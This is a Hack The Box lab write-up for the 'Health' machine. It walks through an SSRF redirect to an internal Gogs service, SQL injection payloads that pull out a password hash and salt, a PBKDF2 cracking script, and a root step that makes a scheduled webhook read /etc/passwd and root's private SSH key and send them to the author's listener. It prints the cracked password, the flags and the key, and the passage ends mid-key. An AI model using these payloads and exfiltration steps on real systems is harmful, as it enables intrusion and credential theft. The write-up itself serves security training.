---
layout: single
title: Health - Hack The Box
excerpt: "Health was a easy-rated Linux machine from Hack The Box, that later got bumped to medium. The initial foothold shows you a new unique way of attacking unreachable services that I really appreciate. Im not sure if this approach could be streamlined, but I did it manually which was very time consuming and unintuitive. Looking back I do agree that this should be a medium box rather then easy, but I can see why they set easy rating to start with as there are very few steps if you know what you're doing. Conclusion, I need to deepen my MySQL skills."
date: 2022-08-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-health/health_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - medium
  - webhook
  - redirect
  - sqli
  - gogs
  - python
  - mysql
  - update table
---

![](/assets/images/htb-writeup-health/health_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Health was a easy-rated Linux machine from Hack The Box, that later got bumped to medium. The initial foothold shows you a new unique way of attacking unreachable services that I really appreciate. Im not sure if this approach could be streamlined, but I did it manually which was very time consuming and unintuitive. Looking back I do agree that this should be a medium box rather then easy, but I can see why they set easy rating to start with as there are very few steps if you know what you're doing. Conclusion, I need to deepen my MySQL skills.



----------------

# USER
### Step 1
**nmap:**
```bash
➜  ~ nmap -Pn -n -p- 10.129.9.180 -v
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 09:17 CEST
Initiating Connect Scan at 09:17
Scanning 10.129.9.180 [65535 ports]
Discovered open port 80/tcp on 10.129.9.180
Discovered open port 22/tcp on 10.129.9.180
Completed Connect Scan at 09:17, 10.64s elapsed (65535 total ports)
Nmap scan report for 10.129.9.180
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp


➜  ~ nmap -Pn -n -p 22,80,3000 10.129.9.180 -sCV
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting http://10.129.9.180 we find the domain `health.htb` in the footer, add it to `/etc/hosts`.
The website allows us to configure a Webhook to check if a remote http service is available or not. 

![](/assets/images/htb-writeup-health/health01.png)

Most likely we should find a way to exploit the webhook service, however I'd like to check if there are any vulnerabilities present first. 
Looking at the source code we find hints that Laravel is running, verify this by running `webanalyze`. If it's an older version we know that this might be exploitable to _"token Unserialize Remote Command Execution"_ or RCE through Laravel's debugging feature.  

```bash
➜  webanalyze ./webanalyze -host http://health.htb
 :: webanalyze        : v1.0
 :: workers           : 4
 :: apps              : technologies.json
 :: crawl count       : 0
 :: search subdomains : true
 :: follow redirects  : false

http://health.htb (0.1s):
    Apache, 2.4.29 (Web servers)
    Ubuntu,  (Operating systems)
    Laravel,  (Web frameworks)
    PHP,  (Programming languages)
```

To check if debugging is enabled visit http://10.129.9.180/profile and we see it's not. 
Investigating the token unserialize RCE we need the `app_key` to exploit, something we cannot find at this point. Also, this is an older vulnerability that works on Laravel version 5.5.40 / 5.6.x < 5.6.30, and visiting http://health.htb/webhook we find that they are running Laravel version 8.83.13.

Back the the Webhook Service. Popularized by GitHub, [Webhooks](https://en.wikipedia.org/wiki/Webhook) are the modern way for apps to receive notifications / events from other servers. A Webhook is a way for you to define a URL that is called by another service when a particular event occurs. For example, you can configure your repo on GitHub to have a Webhook that calls `http://exploit.se/pr` when a new Pull Request is created. 

If we for example set the Webhook URL to:
```bash
https://echo-webhook.exploit.se/SOMETHING_UNIQUE
```

Now when the other service does its POST to that URL the request body is cached and can be retrieved via a GET to the same URL. Here is a simple cURL to demonstrate:
```bash
curl -H "content-type: application/json" -d '{"foo": "bar"}' https://echo-webhook.exploit.se/foobar
curl https://echo-webhook.exploit.se/foobar
{"foo":"bar"}
```

Translated to this box, we set the **Payload URL** to where we want to receive data. We will get an incomming POST request, and either setup a `nc` listener or a webserver capable to receive POSTs.

The **Monitored URL** is what ever we want to retreive information from, after playing around with this parameter for a good while I noticed that I can bypass the restrictions on port 3000 by pointing to myself and having a [301 Redirect](https://stackoverflow.com/questions/2506932/how-do-i-redirect-a-request-to-a-different-url-in-python) to `http://127.0.0.1:3000`

![](/assets/images/htb-writeup-health/health02.png)

```bash
➜  health python3 redirect.py 80 http://127.0.0.1:3000
10.129.9.180 - - [23/Aug/2022 12:32:01] "GET / HTTP/1.0" 302 -

➜  health nc -lvnp 8888                               
listening on [any] 8888 ...
connect to [10.10.14.20] from (UNKNOWN) [10.129.9.180] 59780
POST / HTTP/1.1
Host: 10.10.14.20:8888
Accept: */*
Content-type: application/json
Content-Length: 7663
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"http:\/\/10.10.14.20\/","health":"up","body": 
[... snip ...] 
content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\"
[... snip ...]
id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta
```


### Step 2
Reading about gogs version 0.5.5.1010 it's vulnerable to [SQL Injection through the search](https://www.exploit-db.com/exploits/35238). 

The PoC code isn't working right of the bat, we're returned `"health":"down"` indicating that the SQL syntax is broken somewhere.
```
http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```

Playing around and trying to simplify I get simple `ORDER BY` to give some response:
```bash
➜  health python3 redirect.py 80 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/order/**/by/**/27--/**/-"
10.129.9.180 - - [23/Aug/2022 16:10:00] "GET / HTTP/1.0" 302 -

➜  health python3 webserv.py 8888
INFO:root:POST request,
Path: /
Headers:
Host: 10.10.14.20:8888
Accept: */*
Content-type: application/json
Content-Length: 575



Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"http:\/\/10.10.14.20\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.5","Date":"Tue, 23 Aug 2022 14:08:01 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/order\/**\/by\/**\/20--\/**\/-","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"111"}}

10.129.9.180 - - [23/Aug/2022 16:08:00] "POST / HTTP/1.1" 200 -
```

**NOTE:** `{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"}` is the exfiltrated data. Normally it just returns `{\"data\":[]\}`.

But trying with 28 columns breaks the syntax. 

Next we need to find a injectable column, and trying the normal `@@version` doesn't give any result. As hinted from the poc, column 3 should be injectable so after playing around with some commands I able to extract the username (which I already knew) - thus proving that column 3 is correct and we should focus more here.

```bash
➜  health python3 redirect.py 80 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/name/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"
10.129.9.180 - - [23/Aug/2022 16:57:01] "GET / HTTP/1.0" 302 -


## Response
INFO:root:POST request,
Path: /
Headers:
Host: 10.10.14.20:8888
Accept: */*
Content-type: application/json
Content-Length: 825

Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"http:\/\/10.10.14.20\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.5","Date":"Tue, 23 Aug 2022 14:57:01 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/name\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"170"}}

10.129.9.180 - - [23/Aug/2022 16:57:01] "POST / HTTP/1.1" 200 -
```

Testing more password and pass both returns `"health":"down"`, but **passwd** returns a hash! 
```bash
➜  health python3 redirect.py 80 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"
10.129.9.180 - - [23/Aug/2022 16:59:01] "GET / HTTP/1.0" 302 -

## Response
Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"http:\/\/10.10.14.20\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.5","Date":"Tue, 23 Aug 2022 14:59:01 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/passwd\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"263"}}

10.129.9.180 - - [23/Aug/2022 16:59:01] "POST / HTTP/1.1" 200 -
```

The extracted hash is very long and I don't recognize it, and using `hash-identifier` we get the response **Not Found**.
Reading a bit about Gogs password hash I find this [blog post](https://blog.stigok.com/2017/03/06/lost-password-to-gogs-git-server-docker-instance.html) where a user locked himself out of Gogs trying to create a new hash. Here we find that a **salt** is needed and we should be able to extract it the same way we did with passwd. Unfortunately this blog post doesn't succeed in replicating the hash, so we need to dig deeper for that.

```bash
➜  health python3 redirect.py 80 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"
10.129.9.180 - - [24/Aug/2022 08:46:01] "GET / HTTP/1.0" 302 -


## Response
Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"http:\/\/10.10.14.20\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.5","Date":"Wed, 24 Aug 2022 06:45:01 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/salt\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"173"}}
```

So now we have all three needed ingredients needed to build and crack the password and hopefully gain access to the system:
1. Username: `susanne`
2. Hash: `66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37`
3. Salt: `sO3XIbeW14`


### Step 3
Downloading the [source code](https://github.com/gogs/gogs/releases/tag/v0.5.5) for Gogs 0.5.5 and looking for the password encoding function we find this on line 117:
```go
// gogs/models/user.go
newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
```

As I see it we can solve this two different ways;
1. The programmatically simple solution where we make a script encode a string with the same algorithm and salt, and compare the end result to the found hash.
2. Or make a script that reformats hash + salt to hashcat format. 

Since I'm not a programmer, I chose to go with option one, knowing this will take far longer to crack as I'll never build anything as efficient as hashcat. 
Googling around I found [this post](https://stackoverflow.com/questions/72661995/python-hashing-password-with-pbkdf2) and used it as foundation for my script. I made some tweaks to import strings from list and fired it up:

```python
#!/usr/bin/python3
import hashlib
import binascii

def main():
    salt = b'sO3XIbeW14'
    iterations = 10000
    count = 0
    
    ### ---=== START ===---
    ##Segment for easy troubleshooting
    #password = b'test'
    #key = hashlib.pbkdf2_hmac("sha256", password, salt, iterations, 50)
    #print(key.hex())
    #print(binascii.hexlify(key))
    #pwcompare(key.hex(),password)
    ### ---=== END ===---

    file = input('Enter path to password file: ')
    with open(file) as pw_file:
        for passwd in pw_file:
            s = passwd.rstrip()
            pw_byte = bytes(s, encoding='utf-8')
            key = hashlib.pbkdf2_hmac("sha256", pw_byte, salt, iterations, 50)
            count = count + 1
            pwcompare(key.hex(),s,count)

def pwcompare(hex_key,password,count):
    target_key = '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37'
    
    ## Troubleshooting hash for b'test'
    #target_key = 'fa21b095cfa6e55dff39c11c2ba8a75e7392a9a34f24207d10b38fcde7a0b252a38590631ca6acf3257c8a7edb7598498de9'
    
    if hex_key == target_key:
        print(count,"---=== Password is:",password, "===---")
        exit()
    else:
        print(count,"- Testing password:",password)

if __name__ == "__main__":
    main()
```

```bash
➜  health ./decrypt.py
Enter path to password file: /usr/share/wordlists/rockyou.txt   
1 - Testing password: 123456
2 - Testing password: 12345
[... snip ...]
70966 - Testing password: feilunhai
70967 ---=== Password is: february15 ===---
```

Test to login with cracked credentials and grab user.txt
```bash
➜  health ssh susanne@health.htb
susanne@health.htb password: february15

susanne@health:~$ id && cat user.txt
uid=1000(susanne) gid=1000(susanne) groups=1000(susanne)
a47815867df7df685c95bd170197d921
```

-------
# Root
### Step 1
As always, start with `sudo -l` to look for a easy privesc vector.
```bash
susanne@health:~$ sudo -l
[sudo] password for susanne: 
Sorry, user susanne may not run sudo on health.
```

No dice. Do some manual enumeration and look for anything interesting in `~`, `/opt`, `/var/log`, `/var/www/`, `/tmp`, `/dev/shm` or `/`
```bash
susanne@health:/var/www/html$ cat .env
[... snip ...]
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

There doesn't seem to be the case of password reuse, it might be a good idea to dump the database to find more hashes to crack but I think that's to easy. Instead continue enumerating with pspy64 and/or linPEAS. 

Every minute we see the same set of tasks:
```bash
susanne@health:/dev/shm$ wget http://10.10.14.20/pspy64
susanne@health:/dev/shm$ chmod +x pspy64
susanne@health:/dev/shm$ ./pspy64
[... snip ...]
2022/08/24 08:50:01 CMD: UID=0    PID=24085  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1
2022/08/24 08:50:01 CMD: UID=0    PID=24085  | /usr/sbin/CRON -f 
2022/08/24 08:50:01 CMD: UID=0    PID=24084  | /bin/bash -c sleep 5 && /root/meta/clean.sh 
2022/08/24 08:50:01 CMD: UID=0    PID=24087  | php artisan schedule:run 
2022/08/24 08:50:01 CMD: UID=0    PID=24086  | sleep 5 
2022/08/24 08:50:01 CMD: UID=0    PID=24090  | grep columns 
2022/08/24 08:50:01 CMD: UID=0    PID=24091  | sh -c stty -a | grep columns 
2022/08/24 08:50:06 CMD: UID=0    PID=24094  | mysql laravel --execute TRUNCATE tasks
```

Reading about `TRUNCATE` I find this:
> [`TRUNCATE TABLE`](https://dev.mysql.com/doc/refman/5.6/en/truncate-table.html "13.1.33 TRUNCATE TABLE Statement") empties a table completely. It requires the [`DROP`](https://dev.mysql.com/doc/refman/5.6/en/privileges-provided.html#priv_drop) privilege.
> Logically, [`TRUNCATE TABLE`](https://dev.mysql.com/doc/refman/5.6/en/truncate-table.html "13.1.33 TRUNCATE TABLE Statement") is similar to a [`DELETE`](https://dev.mysql.com/doc/refman/5.6/en/delete.html "13.2.2 DELETE Statement") statement that deletes all rows, or a sequence of [`DROP TABLE`](https://dev.mysql.com/doc/refman/5.6/en/drop-table.html "13.1.28 DROP TABLE Statement") and [`CREATE TABLE`](https://dev.mysql.com/doc/refman/5.6/en/create-table.html "13.1.17 CREATE TABLE Statement") statements.

So why are they truncating table `tasks` every minute, and what can we do with that information? 

If would make sense that the webhook we create will be put in the `tasks` table. Create a new webhook/task from the webpage and verify.

```sql
mysql> use laravel
Database changed
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| 341fc709-d2c8-48e4-9c41-636656bdfad8 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 09:46:23 | 2022-08-24 09:46:23 |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
```


### Step 2
We know that we controll both ``webhookUrl`` and ``monitoredUrl``, with the SQL access we are now able to bypass all restrictions from the webpage. 
So how can we use that to our advantage? Lets look for the php code and see if it gives any hints.

```bash
susanne@health:/var/www/html$ grep -rn monitoredUrl
[... snip ...]
app/Http/Controllers/HealthChecker.php:14:        $res = @file_get_contents($monitoredUrl, false);
```

**file_get_contents()** – This is going to display the text within file(s) by reading the contents as a string, and will not interpret PHP code for execution. Because of this we can enumerate files on the filesystem, as root, and steal `id_rsa` or just grab the flag `root.txt` straight away.

As a PoC, lets try to get `/etc/passwd` printed to my webhookUrl/PayloadURL:

**(1).** Create a new webhook: 

![](/assets/images/htb-writeup-health/health03.png)

**(2).** Verify that it exists in `laravel.tasks`:

```sql
mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

**(3).** [Update](https://devhints.io/mysql) the entry and change monitoredUrl to wanted file (`/etc/passwd`):

```sql
mysql> update tasks set monitoredUrl = "/etc/passwd";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+--------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+--------------+-------------+---------------------+---------------------+
| 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ |         0 | /etc/passwd  | */1 * * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 |
+--------------------------------------+--------------------------+-----------+--------------+-------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

**(4).** Wait for the webhook callback and reap the rewards.

```bash
➜  health python3 webserv.py 8888
[... snip ...]
Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"\/etc\/passwd","health":"up","body":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\nsusanne:x:1000:1000:susanne:\/home\/susanne:\/bin\/bash\ngogs:x:1001:1001::\/home\/gogs:\/bin\/bash\nmysql:x:111:114:MySQL Server,,,:\/nonexistent:\/bin\/false\n"}
```


### Step 3
The PoC was successful, change file and for persistance purposes grab `id_rsa`.
```bash
mysql> update tasks set monitoredUrl = "/root/.ssh/id_rsa";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

```bash
Body:
{"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
```

Format the output to file, and grab `root.txt`.
```bash
➜  health cat unformated-id_rsa 
-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKc